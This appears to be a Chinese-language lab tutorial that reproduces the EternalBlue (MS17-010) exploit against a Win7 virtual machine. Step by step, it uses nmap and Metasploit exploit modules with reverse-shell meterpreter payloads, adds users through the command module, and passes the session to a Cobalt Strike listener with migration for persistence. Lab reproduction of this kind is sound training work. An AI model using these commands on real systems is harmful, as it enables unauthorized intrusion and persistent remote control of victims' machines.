一，环境准备

1，kali:网络适配器：NAT,ip：192.168.48.134，java环境：11.0.14，metasploit已安装好（kali自带），cobaltstrike。

2，win7靶机：网络适配器：NAT，ip:192.168.48.137，防火墙关闭，开启命名管道（win2003以上版本默认关闭）打开cmd
执行gpedit.msc，在计算机配置->windwos设置->安全设置->本地策略->安全选项，修改限制对命名管道和共享的匿名访问为已禁用

二，探测靶机存活

使用nmap扫描192.168.48.1-255网段445端口开放的主机

![1653360538_628c479a3b5f283c12b73.png!small](https://image.3001.net/images/20220524/1653360538_628c479a3b5f283c12b73.png!small)

192.168.48.1应该是网卡，剩下445端口开放的只有192.168.48.137，不难得出该主机为我们的目标靶机

三，msf具体过程与分析

1，打开msf

> msfconsole

2,寻找与ms17-010有关的模块

> search ms17-010

![1653360735_628c485fa407c7fd260a6.png!small](https://image.3001.net/images/20220524/1653360735_628c485fa407c7fd260a6.png!small)

> exploit/windows/smb/ms17_010_eternalblue  
> exploit/windows/smb/ms17_010_psexec  
> auxiliary/admin/smb/ms17_010_command  
> auxiliary/scanner/smb/smb_ms17_010  
> exploit/windows/smb/smb_doublepulsar_rce

模块1：exploit/windows/smb/ms17_010_eternalblue

存在ms17-010漏洞即可使用，不太稳定，容易被杀软识别，有概率导致目标机蓝屏  
模块2：exploit/windows/smb/ms17_010_psexec

需要命名管道开启，配合模块3，比模块1文档，可绕过一些杀软  
模块3：auxiliary/admin/smb/ms17_010_command

该模块是所有利用方法中最为稳定的，并且不会被杀软拦截等。可以直接通过命令添加用户、开启3389、下载Rat等操作。  
模块4：auxiliary/scanner/smb/smb_ms17_010

用来探测ms17-010漏洞是否存在  
模块5：exploit/windows/smb/smb_doublepulsar_rce

双倍脉冲模块

3，使用模块1渗透靶机的过程

运用辅助模块扫描

> use auxiliary/scanner/smb/smb_ms17_010

查看辅助模块需要配置的参数

> show options

设置参数

Required=yes的，可以修改或添加参数值，这里仅添加没有参数值的RHOSTS

> set RHOSTS 192.168.48.137(靶机IP)

![1653363161_628c51d95aaac6bb51bc5.png!small](https://image.3001.net/images/20220524/1653363161_628c51d95aaac6bb51bc5.png!small)

可以看到存在永恒之蓝漏洞

退回使用攻击模块

> use exploit/windows/smb/ms17_010_eternalblue

查看参数

> show options

配置rhosts

> set rhosts 192.168.48.137

配置payload

> set payload windows/x64/meterpreter/reverse_tcp

![1653363612_628c539c9707f1fd54913.png!small](https://image.3001.net/images/20220524/1653363612_628c539c9707f1fd54913.png!small)

运行模块

> run

![1653363652_628c53c45c1fe7101ac02.png!small](https://image.3001.net/images/20220524/1653363652_628c53c45c1fe7101ac02.png!small)

输入shell即可进终端

![1653363721_628c54094237f632815da.png!small](https://image.3001.net/images/20220524/1653363721_628c54094237f632815da.png!small)

4，使用模块2渗透靶机

使用模块4的步骤跟使用模块1相同，不在赘述

使用模块3，可以直接通过命令添加用户

> use auxiliary/admin/smb/ms17_010_command

查看参数

> show options

配置靶机ip

> set rhosts 192.168.48.137

运行

> run

![1653365041_628c59319a0a2034830ed.png!small](https://image.3001.net/images/20220524/1653365041_628c59319a0a2034830ed.png!small)

使用模块2

> use exploit/windows/smb/ms17_010_psexec

配置rhosts

> set rhosts 192.168.48.137

配置payload

> set payload windows/meterpreter/reverse_tcp

运行

> run

![1653365461_628c5ad5454b0f0b51012.png!small](https://image.3001.net/images/20220524/1653365461_628c5ad5454b0f0b51012.png!small)

在Linux系统上的显示windows的shell是有乱码的，使用该命令可以转换成正常的编码：chcp 65001

以上是使用两个攻击模块复现永恒之蓝漏洞的过程

5，将获取的会话转发到 Cobalt Strike 客户端上

在cobalt strike目录下运行：

> ./start.sh

cs打开后点击cobaltstrke-listeners

配置

![1653366678_628c5f969a0f70fb69da2.png!small](https://image.3001.net/images/20220524/1653366678_628c5f969a0f70fb69da2.png!small)

回到msf

> use exploit/windows/local/payload_inject

配置payload（注意：上面监听使用的时http，这里也需要使用http）

> set payload windows/meterpreter/reverse_http

将msf的监听关闭

> set disablepayloadhandler true

做一个权限维持，避免程序崩溃导致权限丢失

> set PrependMigrate true

查看保存下来的会话

> show session

然后将该进程添加上

> set session 1

配置ip和端口（与cs设置的相同即可）

然后

> run

![1653367612_628c633c560ab29d753b9.png!small](https://image.3001.net/images/20220524/1653367612_628c633c560ab29d753b9.png!small)

可以看到cs上也收到了会话

![1653367648_628c63601097ca6ee735b.png!small](https://image.3001.net/images/20220524/1653367648_628c63601097ca6ee735b.png!small)

